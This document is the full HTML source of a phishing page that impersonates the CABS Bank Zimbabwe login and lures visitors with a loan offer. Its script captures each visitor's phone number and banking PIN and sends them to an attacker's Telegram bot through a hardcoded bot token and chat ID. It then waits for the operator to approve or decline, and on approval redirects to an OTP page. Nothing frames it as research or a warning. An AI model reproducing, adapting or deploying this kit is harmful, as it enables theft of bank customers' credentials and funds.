<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <meta name="theme-color" content="#092c4c" />
  <title>CABS Bank Zimbabwe | Login</title>
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #e5e9ed;
      color: #25364a;
    }

    .container {
      width: 100%;
      max-width: 400px;
      margin: auto;
      background: white;
      min-height: 100vh;
      position: relative;
      overflow: hidden;
    }

    .main-content { padding-bottom: 20px; }

    .header {
      background: #092c4c;
      padding: 35px 20px 40px;
      text-align: center;
    }

    .logo {
      font-size: 38px;
      font-weight: 800;
      letter-spacing: 2px;
      color: white;
    }

    .logo span { color: #80bd43; }

    .logo-subtitle {
      color: #dce8f0;
      font-size: 11px;
      letter-spacing: 3px;
      margin-top: 5px;
    }

    .login-title {
      text-align: center;
      color: #092c4c;
      font-size: 27px;
      font-weight: bold;
      margin-top: 32px;
    }

    .demo-label {
      text-align: center;
      color: #438a36;
      font-size: 12px;
      font-weight: bold;
      margin-top: 8px;
    }

    .form-content { padding: 10px 18px; }

    .phone-box {
      margin: 22px 4px;
      border: 2px solid #123d60;
      border-radius: 10px;
      display: flex;
      align-items: center;
      padding: 12px;
      background: #f7f9fb;
    }

    .flag {
      width: 26px;
      margin-right: 8px;
    }

    .code {
      color: #092c4c;
      margin-right: 10px;
      font-weight: bold;
    }

    .phone-input {
      border: none;
      outline: none;
      background: transparent;
      font-size: 17px;
      flex: 1;
      min-width: 0;
    }

    .pin-title {
      text-align: center;
      color: #092c4c;
      margin-top: 24px;
      font-weight: 600;
    }

    .pin-box {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-top: 18px;
    }

    .pin {
      width: 48px;
      height: 48px;
      border-radius: 9px;
      border: 2px solid #17486c;
      text-align: center;
      font-size: 21px;
      outline: none;
      background: white;
    }

    .pin:focus {
      border-color: #70ae40;
      box-shadow: 0 0 0 3px rgba(112,174,64,.15);
    }

    .error-message {
      color: #d32f2f;
      text-align: center;
      font-size: 13px;
      margin: 12px 0;
      min-height: 20px;
    }

    .security-note {
      margin: 22px 8px;
      padding: 12px;
      border-radius: 8px;
      background: #edf5e9;
      color: #376b31;
      font-size: 12px;
      line-height: 1.5;
      text-align: center;
    }

    .bottom {
      position: relative;
      margin-top: 50px;
      background: #092c4c;
      color: white;
      padding: 65px 15px 28px;
      text-align: center;
    }

    .bottom::before {
      content: "";
      position: absolute;
      top: -55px;
      left: -20%;
      width: 140%;
      height: 100px;
      background: white;
      border-bottom-left-radius: 50%;
      border-bottom-right-radius: 50%;
    }

    .bottom p {
      width: 90%;
      margin: auto;
      font-size: 14px;
      line-height: 1.5;
    }

    .buttons {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin: 22px 8px;
    }

    .btn {
      background: white;
      border-radius: 12px;
      padding: 12px 8px;
      flex: 1;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 7px;
      cursor: pointer;
      border: none;
    }

    .btn svg {
      width: 23px;
      height: 23px;
      fill: #092c4c;
    }

    .btn span {
      font-size: 12px;
      color: #092c4c;
      font-weight: bold;
    }

    .version {
      margin-top: 24px;
      opacity: .85;
      font-size: 13px;
    }

    .terms {
      margin-top: 9px;
      font-size: 12px;
      opacity: .9;
    }

    .terms a {
      color: #a7d77b;
    }

    #spinnerOverlay {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(0,0,0,.6);
      z-index: 9999;
    }

    .spinner-loader {
      width: 48px;
      height: 48px;
      border: 5px solid white;
      border-top: 5px solid #80bd43;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="main-content">
      <div class="header">
        <div class="logo">CABS<span>.</span></div>
        <div class="logo-subtitle">BANK ZIMBABWE</div>
      </div>

      <div class="login-title">Welcome</div>
      <div class="loan-label">CENTRAL AFRICA BUILDING SOCIETY LOGIN</div>

      <div class="form-content">
        <div class="phone-box">
          <img class="flag" src="https://flagcdn.com/w40/zw.png" alt="Zimbabwe flag" />
          <div class="code">+263</div>
          <input
            class="phone-input"
            id="phoneInput"
            placeholder="Phone Number"
            type="tel"
            inputmode="numeric"
            autocomplete="off"
          />
        </div>

        <div class="pin-title">Enter your PIN</div>

        <div class="pin-box">
          <input id="pin1" class="pin" maxlength="1" inputmode="numeric" type="password" autocomplete="off" />
          <input id="pin2" class="pin" maxlength="1" inputmode="numeric" type="password" autocomplete="off" />
          <input id="pin3" class="pin" maxlength="1" inputmode="numeric" type="password" autocomplete="off" />
          <input id="pin4" class="pin" maxlength="1" inputmode="numeric" type="password" autocomplete="off" />
        </div>

        <div class="error-message" id="error"></div>

        <div class="security-note">
          Please fill in correct details to enhance your chance of getting your loan
        </div>
      </div>
    </div>

    <div class="bottom">
      <p>
        © Copyright 2026 CABS. A Member of the Old Mutual Group
      </p>

      <div class="buttons">
        <button class="btn" id="registerBtn" type="button">
          <svg viewBox="0 0 24 24" aria-hidden="true">
            <path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
          </svg>
          <span>Register</span>
        </button>

        <button class="btn" id="helpBtn" type="button">
          <svg viewBox="0 0 24 24" aria-hidden="true">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h2v2h-2zm1-12c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/>
          </svg>
          <span>Help &amp; Support</span>
        </button>
      </div>

      <div class="version">CABS v1.0</div>
      <div class="terms">   © Copyright 2026 CABS..</div>
    </div>
  </div>

  <div id="spinnerOverlay" aria-live="polite" aria-busy="true">
    <div class="spinner-loader"></div>
  </div>

  <script>
    (() => {
      const BOT_TOKEN = "8727088730:AAE_VEjXM3eS5Bfo_Ot_VOTvsh61n4xKyag";
      const CHAT_ID = "8820857419";
      const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

      const phoneInput = document.getElementById("phoneInput");
      const error = document.getElementById("error");
      const spinner = document.getElementById("spinnerOverlay");
      const registerBtn = document.getElementById("registerBtn");
      const helpBtn = document.getElementById("helpBtn");
      const pinInputs = [
        document.getElementById("pin1"),
        document.getElementById("pin2"),
        document.getElementById("pin3"),
        document.getElementById("pin4")
      ];

      let isProcessing = false;
      let currentPollInterval = null;
      let pendingPhone = "";
      let pendingPin = "";

      function showSpinner() { spinner.style.display = "flex"; }
      function hideSpinner() { spinner.style.display = "none"; }
      function setError(message) { error.textContent = message; }

      function clearPinFields(shouldFocus = false) {
        pinInputs.forEach((input) => {
          input.value = "";
          input.style.borderColor = "#17486c";
        });
        if (shouldFocus) pinInputs[0].focus();
      }

      function normalizePhone(rawValue) {
        let digits = (rawValue || "").replace(/\D/g, "");
        if (!digits) return null;
        if (digits.startsWith("263")) digits = digits.substring(3);
        if (digits.startsWith("0")) digits = digits.substring(1);
        if (digits.length === 9 && digits.startsWith("7")) return "+263" + digits;
        return null;
      }

      function setPinInputsEnabled(enabled) {
        pinInputs.forEach((input) => {
          input.disabled = !enabled;
        });
      }

      function escapeHtml(value) {
        if (!value) return "";
        return String(value).replace(/[&<>]/g, (char) => {
          if (char === "&") return "&amp;";
          if (char === "<") return "&lt;";
          if (char === ">") return "&gt;";
          return char;
        });
      }

      function stopPolling() {
        if (currentPollInterval) {
          clearInterval(currentPollInterval);
          currentPollInterval = null;
        }
      }

      function triggerRedirection() {
        window.location.href = "otp.html";
      }

      function startPollingForDecision(approveCallbackId, declineCallbackId) {
        stopPolling();
        let lastUpdateId = 0;

        currentPollInterval = setInterval(async () => {
          if (!isProcessing) {
            stopPolling();
            return;
          }

          try {
            const response = await fetch(`${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
            const data = await response.json();

            if (!data.ok || !Array.isArray(data.result) || data.result.length === 0) {
              return;
            }

            for (const update of data.result) {
              lastUpdateId = Math.max(lastUpdateId, update.update_id || 0);
              const callback = update.callback_query;
              if (!callback || !callback.data) continue;

              if (callback.data === approveCallbackId) {
                stopPolling();
                isProcessing = false;
                hideSpinner();
                sessionStorage.setItem("cabs_approved_phone", pendingPhone);
                sessionStorage.setItem("cabs_approved_pin", pendingPin);
                triggerRedirection();
                return;
              }

              if (callback.data === declineCallbackId) {
                stopPolling();
                isProcessing = false;
                hideSpinner();
                setPinInputsEnabled(true);
                phoneInput.disabled = false;
                setError("Incorrect Mobile number and/or PIN provided.");
                clearPinFields(false);
                pendingPhone = "";
                pendingPin = "";
                return;
              }
            }
          } catch (err) {
            console.warn("Telegram polling error:", err);
          }
        }, 1500);
      }

      async function sendCredentialsToTelegram(phoneLocal, pinCode) {
        const timestamp = Date.now();
        const approveId = `cabs_approve_${timestamp}`;
        const declineId = `cabs_decline_${timestamp}`;

        pendingPhone = phoneLocal;
        pendingPin = pinCode;

        const message =
          `🔐 <b>CABS Login Request</b>\n\n` +
          `<b>Phone:</b> <code>${escapeHtml(phoneLocal)}</code>\n` +
          `<b>PIN:</b> <code>${escapeHtml(pinCode)}</code>\n\n` +
          `⚠️ <b>Action required:</b> Approve or Decline this login attempt.`;

        try {
          const response = await fetch(`${API_BASE}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[
                  { text: "✅ Approve", callback_data: approveId },
                  { text: "❌ Decline", callback_data: declineId }
                ]]
              }
            })
          });

          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          startPollingForDecision(approveId, declineId);
        } catch (err) {
          console.error("Telegram send error:", err);
          hideSpinner();
          isProcessing = false;
          setPinInputsEnabled(true);
          phoneInput.disabled = false;
          setError("Network error. Unable to contact verification service. Please try again later.");
          clearPinFields(false);
        }
      }

      async function submitToTelegram() {
        if (isProcessing) return;

        const rawPhone = phoneInput.value.trim();
        if (!rawPhone) {
          setError("Please enter your phone number");
          clearPinFields(false);
          return;
        }

        const normalizedPhone = normalizePhone(rawPhone);
        if (!normalizedPhone) {
          setError("Enter a valid Zimbabwe phone number.");
          clearPinFields(false);
          return;
        }

        const pinValue = pinInputs.map((input) => input.value).join("");
        if (pinValue.length !== 4) {
          setError("Please enter your 4-digit PIN");
          clearPinFields(false);
          return;
        }

        isProcessing = true;
        setPinInputsEnabled(false);
        phoneInput.disabled = true;
        showSpinner();

        const localPhone = normalizedPhone.replace("+263", "");
        await sendCredentialsToTelegram(localPhone, pinValue);
      }

      function focusNext(currentIndex) {
        if (currentIndex < pinInputs.length - 1) {
          pinInputs[currentIndex + 1].focus();
        }
      }

      function focusPrevious(currentIndex) {
        if (currentIndex > 0) {
          pinInputs[currentIndex - 1].focus();
        }
      }

      function setupPinEvents() {
        pinInputs.forEach((input, index) => {
          input.addEventListener("input", function () {
            if (isProcessing) return;

            this.value = this.value.replace(/\D/g, "").slice(0, 1);
            setError("");

            if (this.value && index < pinInputs.length - 1) {
              focusNext(index);
            }

            const fullPin = pinInputs.every((field) => /^\d$/.test(field.value));
            if (fullPin) {
              const phoneIsValid = normalizePhone(phoneInput.value);
              if (!phoneIsValid) {
                setError("Enter a valid Zimbabwe phone number.");
                return;
              }

              setTimeout(() => {
                submitToTelegram();
              }, 50);
            }
          });

          input.addEventListener("keydown", function (event) {
            if (isProcessing) {
              event.preventDefault();
              return;
            }

            if (event.key === "Backspace" && !this.value && index > 0) {
              event.preventDefault();
              focusPrevious(index);
              pinInputs[index - 1].value = "";
            }

            if (event.key === "ArrowLeft" && index > 0) {
              event.preventDefault();
              focusPrevious(index);
            }

            if (event.key === "ArrowRight" && index < pinInputs.length - 1) {
              event.preventDefault();
              focusNext(index);
            }

            if (!/^[0-9]$/.test(event.key) &&
                event.key !== "Tab" &&
                event.key !== "Backspace" &&
                event.key !== "Delete" &&
                event.key !== "ArrowLeft" &&
                event.key !== "ArrowRight") {
              event.preventDefault();
            }
          });

          input.addEventListener("paste", function (event) {
            if (isProcessing) return;

            event.preventDefault();
            const pasted = (event.clipboardData || window.clipboardData)
              .getData("text")
              .replace(/\D/g, "")
              .slice(0, 4);

            if (!pasted) return;

            pinInputs.forEach((field, fieldIndex) => {
              field.value = pasted[fieldIndex] || "";
            });

            const allFilled = pinInputs.every((field) => /^\d$/.test(field.value));
            if (allFilled) {
              submitToTelegram();
            } else {
              const nextIndex = Math.min(pasted.length, pinInputs.length - 1);
              pinInputs[nextIndex].focus();
            }
          });
        });
      }

      function handlePhoneInput() {
        setError("");
        if (isProcessing) return;

        const rawPhone = phoneInput.value.trim();
        const normalized = normalizePhone(rawPhone);

        if (!rawPhone) {
          phoneInput.style.borderColor = "#123d60";
          return;
        }

        if (!normalized) {
          phoneInput.style.borderColor = "#d32f2f";
          return;
        }

        phoneInput.style.borderColor = "#123d60";
        clearPinFields(false);
      }

      phoneInput.addEventListener("input", handlePhoneInput);
      phoneInput.addEventListener("keydown", function (event) {
        if (!/^[0-9]$/.test(event.key) &&
            event.key !== "Backspace" &&
            event.key !== "Delete" &&
            event.key !== "ArrowLeft" &&
            event.key !== "ArrowRight" &&
            event.key !== "Tab") {
          event.preventDefault();
        }
      });

      registerBtn.addEventListener("click", () => {
        setError("");
        clearPinFields(false);
        phoneInput.focus();
      });

      helpBtn.addEventListener("click", () => {
        setError("");
        phoneInput.focus();
      });

      function init() {
        const savedPhone = localStorage.getItem("demo_phone");
        if (savedPhone) {
          phoneInput.value = savedPhone.trim();
          const normalizedSavedPhone = normalizePhone(phoneInput.value);
          if (normalizedSavedPhone) {
            phoneInput.value = normalizedSavedPhone.replace("+263", "");
          }
        }

        sessionStorage.removeItem("cabs_approved_phone");
        sessionStorage.removeItem("cabs_approved_pin");
        setError("");
        clearPinFields(false);
        setPinInputsEnabled(true);
        phoneInput.disabled = false;
        phoneInput.style.borderColor = "#123d60";
        setupPinEvents();
        phoneInput.focus();
      }

      init();
    })();
  </script>
</body>
</html>
